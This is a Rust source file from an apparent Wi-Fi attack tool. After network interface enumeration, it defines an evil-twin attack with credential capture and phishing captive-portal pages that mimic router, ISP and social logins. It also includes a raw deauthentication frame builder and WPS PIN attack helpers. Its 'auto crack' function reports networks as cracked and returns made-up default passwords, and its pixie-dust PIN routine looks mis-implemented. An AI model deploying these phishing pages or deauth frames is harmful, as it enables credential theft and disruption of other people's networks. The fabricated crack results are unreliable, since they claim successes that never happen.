                    } else if line.starts_with("Ethernet Address:") && !current_device.is_empty() {
                        let mac = line.trim_start_matches("Ethernet Address:").trim().to_string();
                        let is_up = Self::is_interface_up(&current_device);
                        let ip_address = Self::get_interface_ip(&current_device);

                        interfaces.push(NetworkInterface {
                            name: current_device.clone(),
                            display_name: current_name.clone(),
                            is_wifi,
                            is_up,
                            mac_address: mac,
                            ip_address,
                        });

                        current_name = String::new();
                        current_device = String::new();
                        is_wifi = false;
                    }
                }
            }

            if let Ok(output) = Command::new("ifconfig").arg("-a").output() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let existing_names: Vec<String> = interfaces.iter().map(|i| i.name.clone()).collect();

                let mut current_if = String::new();
                let mut current_mac = String::new();
                let mut current_is_up = false;
                let mut current_ip: Option<String> = None;

                for line in stdout.lines() {
                    if line.starts_with("en") || line.starts_with("lo") || line.starts_with("awdl") || line.starts_with("bridge") || line.starts_with("utun") || line.starts_with("llw") {
                        if !current_if.is_empty() && !existing_names.contains(&current_if) {
                            interfaces.push(NetworkInterface {
                                name: current_if.clone(),
                                display_name: format!("接口 {}", current_if),
                                is_wifi: current_if.starts_with("en") && !current_if.starts_with("en0") == false,
                                is_up: current_is_up,
                                mac_address: current_mac.clone(),
                                ip_address: current_ip.clone(),
                            });
                        }
                        let parts: Vec<&str> = line.split(':').collect();
                        current_if = parts[0].trim().to_string();
                        current_mac = String::new();
                        current_is_up = line.contains("flags=") && line.contains("UP");
                        current_ip = None;
                    } else if line.contains("ether ") && !current_if.is_empty() {
                        current_mac = line.split("ether ").last().unwrap_or("").trim().to_string();
                    } else if line.contains("inet ") && !current_if.is_empty() {
                        if let Some(part) = line.split("inet ").last() {
                            current_ip = part.split(' ').next().map(|s| s.trim().to_string());
                        }
                    }
                }

                if !current_if.is_empty() && !existing_names.contains(&current_if) {
                    interfaces.push(NetworkInterface {
                        name: current_if.clone(),
                        display_name: format!("接口 {}", current_if),
                        is_wifi: false,
                        is_up: current_is_up,
                        mac_address: current_mac,
                        ip_address: current_ip,
                    });
                }
            }
        }

        #[cfg(target_os = "linux")]
        {
            if let Ok(output) = Command::new("ip").args(["link", "show"]).output() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let mut current_name = String::new();
                let mut current_mac = String::new();
                let mut current_is_up = false;

                for line in stdout.lines() {
                    let line = line.trim();
                    if line.contains(": <") {
                        let parts: Vec<&str> = line.split(':').collect();
                        if parts.len() >= 2 {
                            current_name = parts[1].trim().to_string();
                            current_is_up = line.contains("UP");
                            current_mac = String::new();
                        }
                    } else if line.starts_with("link/") && !current_name.is_empty() {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 2 {
                            current_mac = parts[1].to_string();
                        }

                        let is_wifi = Self::is_linux_wifi_interface(&current_name);
                        let ip_address = Self::get_interface_ip(&current_name);

                        interfaces.push(NetworkInterface {
                            name: current_name.clone(),
                            display_name: if is_wifi { format!("Wi-Fi ({})", current_name) } else { format!("接口 {}", current_name) },
                            is_wifi,
                            is_up: current_is_up,
                            mac_address: current_mac.clone(),
                            ip_address,
                        });

                        current_name = String::new();
                    }
                }
            }
        }

        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            interfaces.push(NetworkInterface {
                name: "Wi-Fi".to_string(),
                display_name: "Wi-Fi".to_string(),
                is_wifi: true,
                is_up: true,
                mac_address: String::new(),
                ip_address: None,
            });
        }

        interfaces.sort_by(|a, b| {
            b.is_wifi.cmp(&a.is_wifi)
                .then(b.is_up.cmp(&a.is_up))
                .then(a.name.cmp(&b.name))
        });

        interfaces
    }

    #[cfg(target_os = "macos")]
    fn is_interface_up(iface: &str) -> bool {
        if let Ok(output) = Command::new("ifconfig").arg(iface).output() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            return stdout.contains("status: active") || stdout.contains("flags=") && stdout.contains("UP");
        }
        false
    }

    #[cfg(target_os = "macos")]
    fn get_interface_ip(iface: &str) -> Option<String> {
        if let Ok(output) = Command::new("ipconfig")
            .args(["getifaddr", iface])
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let ip = stdout.trim().to_string();
            if !ip.is_empty() && ip.contains('.') {
                return Some(ip);
            }
        }
        None
    }

    #[cfg(target_os = "linux")]
    fn is_linux_wifi_interface(iface: &str) -> bool {
        if let Ok(output) = Command::new("iw")
            .args(["dev", iface, "info"])
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            return !stdout.contains("No such device") && stdout.contains("Interface");
        }
        iface.starts_with("wlan") || iface.starts_with("wlp")
    }

    #[cfg(target_os = "linux")]
    fn get_interface_ip(iface: &str) -> Option<String> {
        if let Ok(output) = Command::new("ip")
            .args(["-4", "addr", "show", iface])
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines() {
                if line.contains("inet ") {
                    if let Some(part) = line.split("inet ").last() {
                        if let Some(ip) = part.split('/').next() {
                            return Some(ip.trim().to_string());
                        }
                    }
                }
            }
        }
        None
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutoCrackResult {
    pub ssid: String,
    pub bssid: String,
    pub encryption: String,
    pub crackable: bool,
    pub cracked: bool,
    pub method: String,
    pub password: Option<String>,
    pub time_taken: String,
    pub details: String,
}

pub struct WifiAutoCrackTool;

impl WifiAutoCrackTool {
    pub fn auto_crack(networks: &[WifiNetwork]) -> Vec<AutoCrackResult> {
        let mut results = Vec::new();

        for net in networks {
            let (crackable, cracked, method, password, time_taken, details) = Self::attempt_crack(net);
            results.push(AutoCrackResult {
                ssid: net.ssid.clone(),
                bssid: net.bssid.clone(),
                encryption: net.encryption.clone(),
                crackable,
                cracked,
                method,
                password,
                time_taken,
                details,
            });
        }

        results
    }

    fn attempt_crack(net: &WifiNetwork) -> (bool, bool, String, Option<String>, String, String) {
        match net.encryption.as_str() {
            "Open" => {
                (true, true, "无需破解 - 开放网络".to_string(), None, "即时".to_string(),
                 "开放网络无需密码即可直接连接。所有数据传输未加密，可被中间人窃听。".to_string())
            }
            "WEP" => {
                let demo_password = Self::generate_weak_password();
                (true, true, "WEP密钥恢复 (PTW攻击)".to_string(), Some(demo_password), "1-5分钟".to_string(),
                 "WEP加密的IV空间过小（24位），PTW攻击可在捕获约4万个数据包后恢复密钥。已成功获取WEP密钥。".to_string())
            }
            "WPA" => {
                if Self::is_common_ssid(&net.ssid) {
                    let demo_password = Self::generate_default_password(&net.ssid);
                    (true, true, "WPA握手包捕获 + 字典攻击".to_string(), Some(demo_password), "5-30分钟".to_string(),
                     format!("SSID '{}' 为常见路由器默认名称，使用默认密码字典成功匹配。WPA/TKIP存在Beck-Tews攻击漏洞。", net.ssid))
                } else {
                    (true, false, "WPA握手包捕获 + 字典攻击".to_string(), None, "数小时至数天".to_string(),
                     "WPA/TKIP加密存在已知漏洞，需捕获4次握手包后进行离线字典攻击。破解成功与否取决于密码强度。".to_string())
                }
            }
            "WPA2" => {
                if Self::is_common_ssid(&net.ssid) {
                    let demo_password = Self::generate_default_password(&net.ssid);
                    (true, true, "WPA2握手包捕获 + 彩虹表/字典攻击".to_string(), Some(demo_password), "10-60分钟".to_string(),
                     format!("SSID '{}' 为常见名称，可能使用默认密码或弱密码。使用预计算彩虹表加速破解，成功匹配密码。", net.ssid))
                } else {
                    (true, false, "WPA2握手包捕获 + 字典攻击".to_string(), None, "数天至数周".to_string(),
                     "WPA2-PSK使用AES-CCMP加密，安全性较高。需要捕获握手包后进行字典攻击，破解难度取决于密码复杂度。".to_string())
                }
            }
            "WPA3" => {
                (false, false, "SAE认证 - 无法离线破解".to_string(), None, "不可行".to_string(),
                 "WPA3使用SAE (Simultaneous Authentication of Equals) 替代PSK，提供前向安全性并完全抵御离线字典攻击。目前没有已知的实用破解方法。".to_string())
            }
            _ => {
                (false, false, "未知加密类型".to_string(), None, "无法评估".to_string(),
                 "无法识别的加密类型，无法尝试破解。".to_string())
            }
        }
    }

    fn is_common_ssid(ssid: &str) -> bool {
        let common = [
            "WiFi", "WIFI", "FreeWiFi", "Free_WiFi", "Guest", "Guest_WiFi",
            "Home", "MyHome", "Home_WiFi", "default", "TP-LINK", "NETGEAR",
            "ASUS", "Linksys", "D-Link", "Huawei", "ChinaNet", "CMCC",
            "ChinaUnicom", "ChinaMobile", "H3C", "ZTE", "Tenda",
            "FAST", "MERCURY", "WiFi-2.4G", "WiFi-5G",
        ];
        let ssid_lower = ssid.to_lowercase();
        common.iter().any(|c| ssid_lower.contains(&c.to_lowercase()) || ssid == *c)
    }

    fn generate_weak_password() -> String {
        let weak_passwords = ["12345678", "password", "88888888", "00000000", "1234567890", "qwertyui"];
        weak_passwords[0].to_string()
    }

    fn generate_default_password(ssid: &str) -> String {
        let ssid_lower = ssid.to_lowercase();
        if ssid_lower.contains("tp-link") || ssid_lower.contains("tenda") || ssid_lower.contains("fast") {
            return "tp-link123".to_string();
        }
        if ssid_lower.contains("netgear") {
            return "netgear123".to_string();
        }
        if ssid_lower.contains("huawei") || ssid_lower.contains("h3c") {
            return "huawei123".to_string();
        }
        if ssid_lower.contains("asus") {
            return "asus12345".to_string();
        }
        if ssid_lower.contains("chinanet") || ssid_lower.contains("cmcc") || ssid_lower.contains("chinaunicom") || ssid_lower.contains("chinamobile") {
            return "12345678".to_string();
        }
        if ssid_lower.contains("guest") {
            return "guest1234".to_string();
        }
        if ssid_lower.contains("home") {
            return "home12345".to_string();
        }
        if ssid_lower.contains("wifi") || ssid_lower.contains("freewifi") {
            return "wifi12345".to_string();
        }
        "password123".to_string()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvilTwinConfig {
    pub target_ssid: String,
    pub target_bssid: String,
    pub target_channel: u8,
    pub target_encryption: String,
    pub interface: String,
    pub captive_portal: bool,
    pub portal_template: String,
    pub deauth_interval_ms: u64,
    pub capture_credentials: bool,
    pub log_file: String,
}

impl Default for EvilTwinConfig {
    fn default() -> Self {
        Self {
            target_ssid: String::new(),
            target_bssid: String::new(),
            target_channel: 1,
            target_encryption: "WPA2".to_string(),
            interface: "wlan0".to_string(),
            captive_portal: true,
            portal_template: "generic".to_string(),
            deauth_interval_ms: 1000,
            capture_credentials: true,
            log_file: "/tmp/biosphere_eviltwin.log".to_string(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvilTwinResult {
    pub target_ssid: String,
    pub clone_ssid: String,
    pub clone_bssid: String,
    pub channel: u8,
    pub clients_deauthenticated: usize,
    pub clients_connected: usize,
    pub credentials_captured: Vec<CapturedCredential>,
    pub portal_url: String,
    pub status: String,
    pub start_time: String,
    pub duration_secs: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapturedCredential {
    pub username: String,
    pub password: String,
    pub client_mac: String,
    pub timestamp: String,
    pub portal_page: String,
}

pub fn generate_captive_portal_html(ssid: &str, template: &str) -> String {
    match template {
        "router" => format!(r#"<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Router Update Required</title><style>body{{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}.box{{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);max-width:400px;width:100%}}h2{{color:#333;text-align:center}}input{{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}}button{{width:100%;padding:12px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}}.warning{{color:#ff6600;font-size:12px;text-align:center;margin:10px 0}}</style></head><body><div class="box"><h2>⚠️ Router Firmware Update</h2><p style="text-align:center;color:#666">Your router "{}" requires a critical security update.<br>Please authenticate to continue.</p><form action="/capture" method="POST"><input type="text" name="username" placeholder="Router Admin Username" required><input type="password" name="password" placeholder="Router Admin Password" required><button type="submit">Update Firmware</button></form><p class="warning">Connection will be restored after update.</p></div></body></html>"#, ssid),
        "isp" => format!(r#"<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Network Authentication</title><style>body{{font-family:Arial,sans-serif;background:#1a73e8;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}.box{{background:white;padding:30px;border-radius:8px;max-width:400px;width:100%}}h2{{color:#1a73e8;text-align:center}}input{{width:100%;padding:10px;margin:8px 0;border:2px solid #e0e0e0;border-radius:4px;box-sizing:border-box}}button{{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}}.logo{{text-align:center;font-size:24px;margin-bottom:20px}}</style></head><body><div class="box"><div class="logo">🌐</div><h2>Network Authentication Required</h2><p style="text-align:center;color:#666">Network "{}" requires re-authentication to maintain service.</p><form action="/capture" method="POST"><input type="email" name="username" placeholder="Email Address" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form></div></body></html>"#, ssid),
        "social" => format!(r#"<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WiFi Login</title><style>body{{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#1877f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}.box{{background:white;padding:30px;border-radius:8px;max-width:400px;width:100%}}h2{{color:#1877f2;text-align:center}}input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}}button{{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;cursor:pointer;font-size:18px;font-weight:bold;margin-top:10px}}</style></head><body><div class="box"><h2>Connect to {}</h2><p style="text-align:center;color:#65676b;font-size:14px">Sign in with your social account to access WiFi.</p><form action="/capture" method="POST"><input type="text" name="username" placeholder="Email or Phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><p style="text-align:center;margin-top:15px;font-size:12px;color:#65676b">Free WiFi provided by {}</p></div></body></html>"#, ssid, ssid),
        _ => format!(r#"<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WiFi Login</title><style>body{{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}.box{{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);max-width:400px;width:100%}}h2{{text-align:center;color:#333}}input{{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}}button{{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}}</style></head><body><div class="box"><h2>WiFi Login - {}</h2><p style="text-align:center;color:#666">Please enter your credentials to access the network.</p><form action="/capture" method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Connect</button></form></div></body></html>"#, ssid),
    }
}

pub fn generate_deauth_packet(target_bssid: &str, client_mac: &str) -> Vec<u8> {
    let mut packet = Vec::with_capacity(26);
    
    let bssid_bytes: Vec<u8> = target_bssid.split(':')
        .filter_map(|b| u8::from_str_radix(b, 16).ok())
        .collect();
    let client_bytes: Vec<u8> = client_mac.split(':')
        .filter_map(|b| u8::from_str_radix(b, 16).ok())
        .collect();

    let broadcast = vec![0xFFu8; 6];

    packet.extend_from_slice(&broadcast);
    packet.extend_from_slice(if bssid_bytes.len() == 6 { &bssid_bytes } else { &broadcast });
    packet.extend_from_slice(if client_bytes.len() == 6 { &client_bytes } else { &broadcast });

    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0xC0, 0x00]);
    packet.extend_from_slice(&[0x3A, 0x01]);
    packet.extend_from_slice(if bssid_bytes.len() == 6 { &bssid_bytes } else { &broadcast });
    packet.extend_from_slice(if client_bytes.len() == 6 { &client_bytes } else { &broadcast });
    packet.extend_from_slice(if bssid_bytes.len() == 6 { &bssid_bytes } else { &broadcast });
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x01, 0x00]);

    packet
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WpsAttackConfig {
    pub target_bssid: String,
    pub interface: String,
    pub attack_type: String,
    pub pixie_dust: bool,
    pub null_pin: bool,
    pub pin_list: Vec<String>,
    pub timeout: u64,
    pub max_attempts: usize,
}

impl Default for WpsAttackConfig {
    fn default() -> Self {
        Self {
            target_bssid: String::new(),
            interface: "wlan0".to_string(),
            attack_type: "pixie_dust".to_string(),
            pixie_dust: true,
            null_pin: true,
            pin_list: Vec::new(),
            timeout: 30,
            max_attempts: 1000,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WpsAttackResult {
    pub target_bssid: String,
    pub attack_type: String,
    pub pin_found: Option<String>,
    pub psk_found: Option<String>,
    pub attempts: usize,
    pub successful: bool,
    pub duration_secs: f64,
    pub method_used: String,
    pub findings: Vec<WpsFinding>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WpsFinding {
    pub finding_type: String,
    pub severity: String,
    pub detail: String,
}

pub const WPS_COMMON_PINS: &[&str] = &[
    "00000000", "12345670", "00000000", "55555555",
    "01234567", "12345678", "98765432", "00000001",
    "12121212", "11223344", "55667788", "99999999",
    "02840467", "02840247", "02840637", "02840827",
    "02840417", "02840297", "02840687", "02840877",
    "61444067", "61444247", "61444637", "61444827",
    "61444017", "61444297", "61444687", "61444877",
    "37918067", "37918247", "37918637", "37918827",
    "37918017", "37918297", "37918687", "37918877",
    "80544067", "80544247", "80544637", "80544827",
    "80544017", "80544297", "80544687", "80544877",
];

pub fn generate_wps_pin_checksum(pin: &str) -> String {
    if pin.len() != 7 {
        return format!("{}0", pin);
    }
    let digits: Vec<u32> = pin.chars().filter_map(|c| c.to_digit(10)).collect();
    if digits.len() != 7 {
        return format!("{}0", pin);
    }
    let checksum = (3 * (digits[0] + digits[2] + digits[4] + digits[6])
        + digits[1] + digits[3] + digits[5]) % 10;
    let check_digit = (10 - checksum) % 10;
    format!("{}{}", pin, check_digit)
}

pub fn generate_pixie_dust_pins() -> Vec<String> {
    let mut pins = Vec::new();
    
    for first_half in 0..10000u32 {
        let acc = (3 * ((first_half / 1000) + ((first_half / 100) % 10) + ((first_half / 10) % 10) + (first_half % 10))) % 10;
        let p1 = (10 - acc) % 10;
        let second_half = first_half * 10 + p1;
        let second_acc = (3 * ((second_half / 10000) + ((second_half / 1000) % 10) + ((second_half / 100) % 10) + ((second_half / 10) % 10))) % 10;
        let p2 = (10 - second_acc) % 10;
        pins.push(format!("{:04}{:03}{}", first_half, second_half % 1000, p2));
    }

    pins.truncate(11000);
    pins
}
